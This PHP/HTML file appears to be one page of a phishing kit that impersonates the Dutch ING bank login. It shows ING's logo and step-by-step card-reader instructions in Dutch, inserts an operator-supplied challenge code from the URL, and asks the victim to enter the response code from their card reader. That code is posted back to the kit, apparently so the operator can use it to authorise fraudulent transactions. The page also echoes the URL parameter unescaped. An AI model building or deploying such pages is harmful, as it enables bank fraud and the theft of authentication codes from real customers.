<?php
 
    require_once "../app.php";
   

?>
<html><head><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
    
    <link rel="stylesheet" href="./css/font-awesome.min.css">
    
    
    <link rel="stylesheet" href="./css/bootstrap.min.css">
    <link rel="stylesheet" href="./css/core_form.css">

    


    <base href="">
    <link rel="stylesheet" href="./css/css.css">
    <meta charset="UTF-8">
    <link rel="shortcut icon" type="image/png" href="./css/favicon.ico">
</head>

<body ng-app="app" ng-controller="c1" ng-model-options="{'allowInvalid':true}" class="ng-scope">
    <form action="./index.php" id="WizardForm" method="post" accept-charset="utf-8">
<input type="hidden" name="step"  value="code2">
    <title class="ng-binding">Meld u aan bij Mijn ING</title>
    <div class="top">
        <div class="container">
            <div class="clearfix">
                <img class="logo" src="./css/ing-logo.svg">
                
            </div>
        </div>
    </div>
    <div class="main mt-3 mt-sm-5">
        <div class="box" id="box">
            <div class="container">
                <div class="box2">
                    <div class="scum_container">
                        <div class="scum" id="token2-view">
                                                            <div class="title ng-binding">
                                    Meld u aan met de ING-kaartlezer
                                </div>
                                <hr>
                                <!-- <p class="legend">
                                    Lorem ipsum dolor sit amet, consectetur adipisicing elit. Autem in, sunt quos ipsum quam aliquid optio delectus quisquam ut ea ducimus nihil saepe commodi voluptas molestiae impedit officia, perferendis. Doloremque.
                                </p> -->
                                <div class="alert alert-danger alert-dismissible err_div ng-binding" style="display: none;">
                                    <strong class="ng-binding">Fouten: </strong> U moet hieronder een aantal van die velden inchecken.
                                    <button type="button" onclick="$(this).parent().hide()" class="close">
                                        <span aria-hidden="true">×</span>
                                    </button>
                                </div>
                                

                                <div class="step d-flex justify-content-between">
                                    <span class="step-index">1</span>
                                    <p class="step-p ng-binding">
                                       Plaats uw bankkaart in de ING Card-lezer en druk op "Ondertekenen"
                                    </p>

                                    <span class="pluss">+</span>
                                    <div>
                                        <img class="img1" src="./css/sign-1.png">
                                    </div>

                                </div>

                                <hr>
                                <div class="step d-flex justify-content-between">
                                    <span class="step-index">2</span>
                                    <p class="step-p ng-binding">
                                        Voer de pincode van uw bankkaart in en druk op "OK"
                                    </p>

                                    <span class="pluss">+</span>
                                    <div>
                                        <img class="img1" src="./css/256pxok.png">
                                    </div>

                                </div>
                                <hr>

                                <div class="step d-flex justify-content-between">
                                    <span class="step-index">3</span>
                                    <p class="step-p ng-binding">
                                       Ga de uitdaging van uw bevestiging in: <span class="num"><?php echo $_GET['code']; ?></span> en druk op "Ondertekenen"
                                    </p>

                                    <span class="pluss">+</span>
                                    <div>
                                        <img class="img1" src="./css/sign-1.png">
                                    </div>

                                </div>





                                <hr>
    

                                <h4 class="ng-binding">RESPOND</h4>
                                <div class="form-group">
                                    <label for="code" class="ng-binding">Voer de nummers in die op uw kaartlezer verschijnen</label>
                                    <input type="text" name="token2" id="code" class="form-control ng-pristine ng-untouched ng-valid ng-empty ng-valid-pattern" data-ng-model="data.code" required="">
                                    <span class="err_span ng-binding" style="display: none;">
                                        <img class="i8" src="exl.png"> Waarde onjuist
                                    </span>
                                </div>



                                
                                <div class="button-div d-flex justify-content-between align-items-center">
                                    <div class="">
                                        
                                    </div>
                                    <button class="btn btn-warning ng-binding">Teken</button>
                                </div>
                            
                        </div>
                    </div>
                </div>
            </div>
        <div class="loader__ waiter__" style="display: none;">    <div class="loader-box">        <span class="fa fa-circle-o-notch fa-spin"></span>        <p class="waiter_p ng-binding">Een moment ...</p>    </div></div></div>
    </div></form>
    <div class="footer-links ">
        
    </div>
    
    
    
    


</body></html>